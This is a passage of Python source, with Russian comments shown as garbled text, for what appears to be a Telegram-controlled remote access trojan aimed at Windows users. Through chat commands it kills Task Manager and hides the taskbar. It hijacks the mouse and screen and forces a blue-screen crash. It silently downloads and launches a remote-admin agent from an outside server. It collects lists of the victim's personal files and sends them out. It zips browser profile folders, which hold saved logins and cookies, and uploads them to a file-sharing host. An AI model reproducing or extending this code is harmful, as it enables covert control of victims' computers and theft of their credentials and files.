def process_removal_input(message): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤–≤–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –Ω–∞–∑–≤–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è
    process_name = message.text.strip()
    if process_name:
        remove_process_to_track(message, process_name)
        bot.register_next_step_handler(message, files_process)
    else:
        bot.send_message(message.chat.id, "[TASKKILLER]\n\n–ù–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º.")
        bot.register_next_step_handler(message, files_process)
scan_taskmgr = True
def check_taskmgr(message=None): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
    global scan_taskmgr
    while scan_taskmgr:
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'Taskmgr.exe':
                try:
                    p = psutil.Process(process.info['pid'])
                    p.terminate()
                    if message:
                        bot.send_message(message.chat.id, "[TASKKILLER] –ü—Ä–æ—Ü–µ—Å—Å Taskmgr.exe –±—ã–ª –Ω–∞–π–¥–µ–Ω –∏ –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω.")
                except psutil.NoSuchProcess:
                    pass
        time.sleep(3)
taskmgr_thread = threading.Thread(target=check_taskmgr)
def start_scan_taskmgr(message=None): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
    global taskmgr_thread
    global scan_taskmgr
    if not taskmgr_thread.is_alive():
        scan_taskmgr = True
        taskmgr_thread = threading.Thread(target=check_taskmgr, args=(message,))
        taskmgr_thread.start()
        if message:
            bot.send_message(message.chat.id, "[TASKKILLER] –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ Taskmgr.exe –Ω–∞—á–∞—Ç–æ.")
def stop_scan_taskmgr(message=None): # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
    global scan_taskmgr
    scan_taskmgr = False
    taskmgr_thread.join()
    if message:
        bot.send_message(message.chat.id, "[TASKKILLER] –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ Taskmgr.exe –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ.")
####################################

###–¢–ï–°–¢–´######–¢–ï–°–¢–´######–¢–ï–°–¢–´######–¢–ï–°–¢–´###
def start_taskbar_hide(message): #–§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ —Å–µ–∫—É–Ω–¥ –¥–ª—è —Å–∫—Ä—ã—Ç–∏—è –ø–∞–Ω–µ–ª–∏ –∑–∞–¥–∞—á
    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–µ–∫—É–Ω–¥ –¥–ª—è —Å–∫—Ä—ã—Ç–∏—è –ø–∞–Ω–µ–ª–∏ –∑–∞–¥–∞—á:")
    bot.register_next_step_handler(msg, process_hide_taskbar)
def process_hide_taskbar(message): #–ü—Ä–æ—Ü–µ—Å—Å —Å–∫—Ä—ã—Ç–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –∑–∞–¥–∞—á
    try:
        seconds = int(message.text)
        if seconds > 0:
            taskbar_hide()
            bot.send_message(message.chat.id, f"–ü–∞–Ω–µ–ª—å –∑–∞–¥–∞—á —Å–∫—Ä—ã—Ç–∞ –Ω–∞ {seconds} —Å–µ–∫—É–Ω–¥.")
            time.sleep(seconds)
            taskbar_vis()
            bot.send_message(message.chat.id, f"–ü–∞–Ω–µ–ª—å –∑–∞–¥–∞—á —Å–Ω–æ–≤–∞ –≤–∏–¥–Ω–∞.")
        else:
            bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ —Å–µ–∫—É–Ω–¥.")
    except ValueError:
        bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ —Å–µ–∫—É–Ω–¥.")
def taskbar_hide(): #–§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–∫—Ä—ã—Ç–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –∑–∞–¥–∞—á
    taskbar_hwnd = ctypes.windll.user32.FindWindowW(u'Shell_TrayWnd', None)
    ctypes.windll.user32.ShowWindow(taskbar_hwnd, 0)
def taskbar_vis(): #–§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –∑–∞–¥–∞—á
    taskbar_hwnd = ctypes.windll.user32.FindWindowW(u'Shell_TrayWnd', None) 
    ctypes.windll.user32.ShowWindow(taskbar_hwnd, 5)
def check_agent_file(message): #–§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∏—Å–∫–∞ Agent.exe
    bot.send_message(message.chat.id, "–ü–æ–∏—Å–∫ –Ω—É–∂–Ω–æ–≥–æ —Ñ–∞–π–ª–∞...")
    current_directory = os.path.dirname(__file__)
    agent_filename = os.path.join(current_directory, 'agent.exe')
    return os.path.isfile(agent_filename)
def download_agent(url, save_path, message): #–§—É–Ω–∫—Ü–∏—è –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ Agent.exe
    bot.send_message(message.chat.id, "–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é –ø—Ä–æ–≥—Ä–∞–º–º—É...")
    response = requests.get(url)
    with open(save_path, 'wb') as file:
        file.write(response.content)
    time.sleep(5)
def open_program_and_screenshot(message): #–§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–∫—Ä–∏–Ω–∞ Agent.exe
    current_directory = os.path.dirname(__file__)
    agent_filename = os.path.join(current_directory, 'agent.exe')
    try:
        subprocess.Popen(agent_filename)
        bot.send_message(message.chat.id, "–û—Ç–∫—Ä—ã–≤–∞—é –ø—Ä–æ–≥—Ä–∞–º–º—É...")
        while True:
            window = gw.getWindowsWithTitle("RMS –ê–≥–µ–Ω—Ç")
            if window:
                break
            time.sleep(2)
        bot.send_message(message.chat.id, "–î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç...")
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(e)
        return None
def agent_screenshot(message): #–û–±—â–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø–æ–∏—Å–∫–∞, —É—Å—Ç–∞–Ω–æ–≤–∫–∏, –∏ —Å–∫—Ä–∏–Ω–∞ Agent.exe –±–µ–∑ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –ø–æ–º–µ—à–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º–µ
    chat_id = message.chat.id
    try:
        if not check_agent_file(message):
            agent_url = 'https://23031.selcdn.ru/rms-distr-01/agent.exe'
            agent_filename = os.path.join(os.path.dirname(__file__), 'agent.exe')
            download_agent(agent_url, agent_filename, message)
        screenshot_path = open_program_and_screenshot(message)
        if screenshot_path:
            with open(screenshot_path, "rb") as screenshot_file:
                bot.send_photo(chat_id, screenshot_file)
            os.remove(screenshot_path)
    except Exception as e:
        print(e)
        bot.send_message(chat_id, "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑.")
###–¢–ï–°–¢–´######–¢–ï–°–¢–´######–¢–ï–°–¢–´######–¢–ï–°–¢–´###

####################################
pythoncom.CoInitialize()
pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
state = {}
mouse_locked = False
mouse_controller = MouseController()
mouse = Controller()
currentMouseX, currentMouseY = mouse.position
def lock_mouse(): #–ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –º—ã—à–∏
    global mouse_locked
    while mouse_locked:
        move_mouse_to_center()
        time.sleep(0.01)
def unlock_mouse(e): #–ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –º—ã—à–∏
    global mouse_locked
    mouse_locked = False
def move_mouse_to_center(): #–§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–µ—Ä–µ–Ω–æ—Å–∞ –º—ã—à–∏ –≤ —Ü–µ–Ω—Ç—Ä
    screen_width, screen_height = pyautogui.size()
    center_x = screen_width // 2
    center_y = screen_height // 2
    pyautogui.moveTo(center_x, center_y)
class User:
	def __init__(self):
		keys = ['urldown', 'fin', 'curs']

		for key in keys:
			self.key = None
ip = socket.gethostbyname(socket.gethostname())
pyautogui.FAILSAFE = False
MessageBox = ctypes.windll.user32.MessageBoxW
if os.path.exists("msg.pt"):
	pass
else:
	f = open('msg.pt', 'tw', encoding='utf-8')
	f.close
def windowimage(message):
    bot.send_message(message.chat.id, "–ü—Ä–∏—à–ª–∏—Ç–µ –ø–æ–∂–∞–ª—É–π—Å—Ç–∞ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é!")
    bot.register_next_step_handler(message, process_image)
def process_image(message):
    try:
        chat_id = message.chat.id
        if message.photo:
            file_id = message.photo[-1].file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open("temp_photo.jpg", 'wb') as temp_file:
                temp_file.write(downloaded_file)
            image = cv2.imread("temp_photo.jpg")
            bot.send_message(chat_id, "–û–∫–Ω–æ —Å –∫–∞—Ä—Ç–∏–Ω–∫–æ–π –±—ã–ª–æ –æ—Ç–∫—Ä—ã—Ç–æ.")
            cv2.namedWindow("Image", cv2.WND_PROP_FULLSCREEN)
            cv2.setWindowProperty("Image", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
            cv2.setWindowProperty("Image", cv2.WND_PROP_TOPMOST, cv2.WND_PROP_TOPMOST)
            cv2.imshow("Image", image)
            bot.send_message(my_id, "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=rape_keyboard)
            while True:
                key = cv2.waitKey(1)
                if key == 27:  # –ö–æ–¥ –∫–ª–∞–≤–∏—à–∏ Esc
                    cv2.destroyAllWindows()
                    os.remove("temp_photo.jpg")
                    bot.send_message(chat_id, "–û–∫–Ω–æ —Å –∫–∞—Ä—Ç–∏–Ω–∫–æ–π –±—ã–ª–æ –∑–∞–∫—Ä—ã—Ç–æ.")
                    break
        else:
            bot.send_message(chat_id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é.")
    except Exception as e:
        print(e)
        bot.send_message(chat_id, "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑.")
def random_mouse_60():
    root = tk.Tk()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    pyautogui.FAILSAFE = False
    start_time = time.time()
    while time.time() - start_time < 60:  # –í—ã–ø–æ–ª–Ω—è—Ç—å –≤ —Ç–µ—á–µ–Ω–∏–µ 60 —Å–µ–∫—É–Ω–¥
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        pyautogui.moveTo(x, y)
        time.sleep(0.1)  # –ü–µ—Ä–µ–º–µ—â–∞—Ç—å –∫–∞–∂–¥—ã–µ 0.1 —Å–µ–∫—É–Ω–¥—ã
def start_random_mouse(message):
    bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–µ–∫—É–Ω–¥ –¥–ª—è —Ä–∞–Ω–¥–æ–º–Ω—ã—Ö –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–π –∫—É—Ä—Å–æ—Ä–∞:")
    bot.register_next_step_handler(message, perform_random_mouse)
def perform_random_mouse(message):
    try:
        duration_seconds = int(message.text)
        if duration_seconds <= 0:
            bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ —Å–µ–∫—É–Ω–¥.")
            return
        bot.send_message(message.chat.id, f"–†–∞–Ω–¥–æ–º–Ω—ã–µ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è –∫—É—Ä—Å–æ—Ä–∞ –Ω–∞—á–∞—Ç—ã! –≠—Ñ—Ñ–µ–∫—Ç –ø—Ä–æ–¥–ª–∏—Ç—Å—è {duration_seconds} —Å–µ–∫—É–Ω–¥.")
        bot.register_next_step_handler(message, mouse_process)
        
        root = tk.Tk()
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        pyautogui.FAILSAFE = False
        start_time = time.time()
        while time.time() - start_time < duration_seconds:
            x = random.randint(0, screen_width)
            y = random.randint(0, screen_height)
            pyautogui.moveTo(x, y)
            time.sleep(0.1)
        
        bot.send_message(message.chat.id, "–†–∞–Ω–¥–æ–º–Ω—ã–µ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è –∫—É—Ä—Å–æ—Ä–∞ –∑–∞–≤–µ—Ä—à–µ–Ω—ã.")
    except ValueError:
        bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ —Å–µ–∫—É–Ω–¥.")
        bot.register_next_step_handler(message, mouse_process)
def rotatescreen_process(message):
    screen = rotatescreen.get_primary_display()
    bot.send_message(message.chat.id, "–ü–µ—Ä–µ–≤–µ—Ä—Ç—ã—à –∑–∞–ø—É—â–µ–Ω! –≠—Ñ—Ñ–µ–∫—Ç –ø—Ä–æ–¥–ª–∏—Ç—Å—è –æ–∫–æ–ª–æ 5 —Å–µ–∫—É–Ω–¥.")
    for i in range(25):
        time.sleep(0.1)
        screen.rotate_to(i*90 % 360)
def wowscreen_60():
    image_screenshot = pyautogui.screenshot()
    _array_image = numpy.array(image_screenshot)
    image = cv2.cvtColor(_array_image, cv2.COLOR_RGB2BGR)
    cv2.namedWindow("window", cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty("window", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
    cv2.setWindowProperty("window", cv2.WND_PROP_TOPMOST, cv2.WND_PROP_TOPMOST)
    def mouse_evt(event, x, y, flags, param):
        if event == cv2.EVENT_MOUSEMOVE:
            win32api.SetCursor(win32api.LoadCursor(0, win32con.IDC_ARROW))
    cv2.setMouseCallback("window", mouse_evt)
    cv2.imshow("window", image)
    _width = _array_image.shape[1]
    _height = _array_image.shape[0]
    _columns = 40
    _step = _width // _columns
    _move_down_by = 5
    _start_time = time.time()
    while True:
        _current_time = time.time()
        if _current_time - _start_time >= 60:
            break
        _col = random.randint(0, _columns) * _step
        for i in range(_move_down_by):
            _array_image[i + 1:_height, _col:_col + _step, :3] = _array_image[i:_height - 1, _col:_col + _step, :3]
        image = cv2.cvtColor(_array_image, cv2.COLOR_RGB2BGR)
        cv2.imshow("window", image)
        cv2.waitKey(1)
    cv2.destroyAllWindows()
def start_wowscreen(message):
    bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–µ–∫—É–Ω–¥ –¥–ª—è —ç—Ñ—Ñ–µ–∫—Ç–∞ –ø–ª—ã–≤—É—â–µ–≥–æ —ç–∫—Ä–∞–Ω–∞:")
    bot.register_next_step_handler(message, perform_wowscreen)
def perform_wowscreen(message):
    try:
        duration = int(message.text)
        if duration <= 0:
            bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–µ–∫—É–Ω–¥.")
            return
        bot.send_message(message.chat.id, f"–≠—Ñ—Ñ–µ–∫—Ç –ø–ª—ã–≤—É—â–µ–≥–æ —ç–∫—Ä–∞–Ω–∞ –±—É–¥–µ—Ç –∞–∫—Ç–∏–≤–µ–Ω –≤ —Ç–µ—á–µ–Ω–∏–µ {duration} —Å–µ–∫—É–Ω–¥.")
        image_screenshot = pyautogui.screenshot()
        _array_image = numpy.array(image_screenshot)
        image = cv2.cvtColor(_array_image, cv2.COLOR_RGB2BGR)
        cv2.namedWindow("window", cv2.WND_PROP_FULLSCREEN)
        cv2.setWindowProperty("window", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        cv2.setWindowProperty("window", cv2.WND_PROP_TOPMOST, cv2.WND_PROP_TOPMOST)
        def mouse_evt(event, x, y, flags, param):
            if event == cv2.EVENT_MOUSEMOVE:
                win32api.SetCursor(win32api.LoadCursor(0, win32con.IDC_ARROW))
        cv2.setMouseCallback("window", mouse_evt)
        cv2.imshow("window", image)
        _width = _array_image.shape[1]
        _height = _array_image.shape[0]
        _columns = 40
        _step = _width // _columns
        _move_down_by = 5
        _start_time = time.time()
        while True:
            _current_time = time.time()
            if _current_time - _start_time >= duration:
                break
            _col = random.randint(0, _columns) * _step
            for i in range(_move_down_by):
                _array_image[i + 1:_height, _col:_col + _step, :3] = _array_image[i:_height - 1, _col:_col + _step, :3]
            image = cv2.cvtColor(_array_image, cv2.COLOR_RGB2BGR)
            cv2.imshow("window", image)
            cv2.waitKey(1)
        cv2.destroyAllWindows()
        bot.send_message(message.chat.id, "–≠—Ñ—Ñ–µ–∫—Ç –ø–ª—ã–≤—É—â–µ–≥–æ —ç–∫—Ä–∞–Ω–∞ –æ—Ç–∫–ª—é—á–µ–Ω.")
    except ValueError:
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–µ–∫—É–Ω–¥.")
waiting_for_wallpaper = {}
def set_wallpaper(image_path):
    try:
        wallpaper_path = os.path.abspath(image_path)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Control Panel\Desktop", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "0")# 2 - –ó–∞—Å—Ç–∞–≤–∫–∞ —Ä–∞—Å—Ç—è–≥–∏–≤–∞–µ—Ç—Å—è –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è —ç–∫—Ä–∞–Ω–∞
        winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")# 0 - –†–∞—Å—Ç—è–≥–∏–≤–∞—Ç—å –æ–±–æ–∏
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ –æ–±–æ–µ–≤: {str(e)}")
        return False
def set_wallpaper_command(message):
    bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –º–Ω–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –æ–±–æ–µ–≤.")
    waiting_for_wallpaper[message.chat.id] = True
@bot.message_handler(content_types=['document', 'photo'])
def handle_document_or_photo(message):
    if message.chat.id in waiting_for_wallpaper and waiting_for_wallpaper[message.chat.id]:
        try:
            file_info = None
            if message.document:
                file_info = bot.get_file(message.document.file_id)
            elif message.photo:
                file_info = bot.get_file(message.photo[-1].file_id)
            if file_info:
                downloaded_file = bot.download_file(file_info.file_path)
                src = message.document.file_name if message.document else 'input_image.png'
                with open(src, 'wb') as new_file:
                    new_file.write(downloaded_file)
                if set_wallpaper(os.path.abspath(src)):
                    bot.send_message(message.chat.id, "–û–±–æ–∏ —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã.")
                else:
                    bot.send_message(message.chat.id, "–û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ –æ–±–æ–µ–≤.")
                os.remove(src)
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Ñ–∞–π–ª –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –æ–±–æ–µ–≤.")
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ —Ñ–∞–π–ª–∞: {str(e)}")
            bot.send_message(message.chat.id, "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ —Ñ–∞–π–ª–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")
        waiting_for_wallpaper[message.chat.id] = False
def perform_grab_arch(message):
    bot.send_message(message.chat.id, "–ü–æ–∏—Å–∫ –∞—Ä—Ö–∏–≤–æ–≤ –Ω–∞—á–∞–ª—Å—è...")
    folders_to_search = [
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Desktop"),
    ]
    archives = find_and_save_archives("archives_list.txt", folders_to_search)
    if archives:
        with open("archives_list.txt", "rb") as file:
            bot.send_document(message.chat.id, file)
        os.remove("archives_list.txt")
    else:
        bot.send_message(message.chat.id, "–ê—Ä—Ö–∏–≤—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
def perform_grab_txt(message):
    bot.send_message(message.chat.id, "–ü–æ–∏—Å–∫ —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤ –Ω–∞—á–∞–ª—Å—è...")
    text_document_extensions = (".txt", ".docx")
    folders_to_search = [
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Desktop"),
    ]
    text_documents = find_and_save_files("text_documents_list.txt", folders_to_search, text_document_extensions)
    if text_documents:
        with open("text_documents_list.txt", "rb") as file:
            bot.send_document(message.chat.id, file)
        os.remove("text_documents_list.txt")
    else:
        bot.send_message(message.chat.id, "–¢–µ–∫—Å—Ç–æ–≤—ã–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
def send_files_document(chat_id, files_list, message_text):
    if files_list:
        with open(files_list, "rb") as file:
            bot.send_document(chat_id, file)
        os.remove(files_list)
    else:
        bot.send_message(chat_id, message_text)
def perform_quick_screenshot(message):
    bot.send_chat_action(my_id, 'upload_photo')
    screenshot_file = get_screenshot()
    if screenshot_file:
        bot.send_photo(my_id, open(screenshot_file, "rb"))
        os.remove(screenshot_file)
    else:
        bot.send_message(my_id, "–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–Ω—è—Ç–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: " + screenshot_file)
def perform_grab_photos(message):
    bot.send_message(my_id, "–ü–æ–∏—Å–∫ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–π –Ω–∞—á–∞–ª—Å—è...")
    photo_extensions = (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff")
    folders_to_search = [
        os.path.expanduser("~\Downloads"),
        os.path.expanduser("~\Documents"),
        os.path.expanduser("~\Pictures"),
        os.path.expanduser("~\Desktop"),
    ]
    photo_files = find_and_save_files("photo_list.txt", folders_to_search, photo_extensions)
    send_files_document(message.chat.id, "photo_list.txt", "–§–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
def perform_grab_music(message):
    bot.send_message(my_id, "–ü–æ–∏—Å–∫ –º—É–∑—ã–∫–∞–ª—å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ –Ω–∞—á–∞–ª—Å—è...")
    music_extensions = (".mp3", ".wav", ".flac")
    folders_to_search = [
        os.path.expanduser("~\Downloads"),
        os.path.expanduser("~\Documents"),
        os.path.expanduser("~\Music"),
        os.path.expanduser("~\Desktop"),
    ]
    music_files = find_and_save_files("music_list.txt", folders_to_search, music_extensions)
    send_files_document(message.chat.id, "music_list.txt", "–ú—É–∑—ã–∫–∞–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
def perform_grab_video(message):
    bot.send_message(my_id, "–ü–æ–∏—Å–∫ –≤–∏–¥–µ–æ—Ñ–∞–π–ª–æ–≤ –Ω–∞—á–∞–ª—Å—è...")
    video_extensions = (".mp4", ".avi", ".mov", ".mkv")
    folders_to_search = [
        os.path.expanduser("~\Downloads"),
        os.path.expanduser("~\Documents"),
        os.path.expanduser("~\Videos"),
        os.path.expanduser("~\Desktop"),
    ]
    video_files = find_and_save_files("video_list.txt", folders_to_search, video_extensions)
    send_files_document(message.chat.id, "video_list.txt", "–í–∏–¥–µ–æ—Ñ–∞–π–ª—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
def trigger_bsod_process():
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
def trigger_bsod(message):
    bot.send_message(message.chat.id, "–°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω —Å–º–µ—Ä—Ç–∏ –≤—ã–∑–≤–∞–Ω.")
    trigger_bsod_process()
def upload_folder_to_fileio(folder_path, folder_name):
    try:
        archive_name = f"{folder_name}_User_Data.zip"
        archive_path = os.path.join("temp_browser_data", archive_name)
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as archive:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    archive.write(file_path, os.path.relpath(file_path, folder_path))
        fileio_url = upload_to_fileio(archive_path)
        os.remove(archive_path)
        return fileio_url
    except Exception as e:
        log_message(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–∞–ø–∫–∏ {folder_name} –Ω–∞ —Ñ–∞–π–ª–æ–æ–±–º–µ–Ω–Ω–∏–∫: {str(e)}")
        log_message("___________________________________\n")
        return None
def copy_browsers_data(message):
    try:
        chat_id = message.chat.id
        bot.send_message(message.chat.id, "–ì—Ä–∞–±–±–µ—Ä –ø–∞–ø–æ–∫ User Data –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!\n–õ–æ–≥–∏ –≤ —Ç–µ–∫—Å—Ç–æ–≤–æ–º —Ñ–∞–π–ª–µ –æ—Ç–ø—Ä–∞–≤—è—Ç—Å—è –≤–∞–º —á–µ—Ä–µ–∑ 5-10 –º–∏–Ω—É—Ç, –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ä–∞–∑–º–µ—Ä–æ–≤ –∞—Ä—Ö–∏–≤–æ–≤.\n____________________________")
        log_file_path = "copy_browsers_data_log.txt"
        with open(log_file_path, "w", encoding="utf-8") as log_file:
            log_message("–ù–∞—á–∏–Ω–∞—é –∏—Å–∫–∞—Ç—å –Ω—É–∂–Ω—ã–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏...\n___________________________________\n")
        client_username = os.getlogin()
        browser_directories = {
            "Avast": r'C:\Users\{}\AppData\Local\AVAST Software\Browser\User Data'.format(client_username),
            "Amigo": r'C:\Users\{}\AppData\Amigo\User Data'.format(client_username),
            "Torch": r'C:\Users\{}\AppData\Torch\User Data'.format(client_username),
            "Kometa": r'C:\Users\{}\AppData\Kometa\User Data'.format(client_username),
            "Orbitum": r'C:\Users\{}\AppData\Orbitum\User Data'.format(client_username),
            "7star": r'C:\Users\{}\AppData\7Star\7Star\User Data'.format(client_username),
            "Cent-browser": r'C:\Users\{}\AppData\CentBrowser\User Data'.format(client_username),
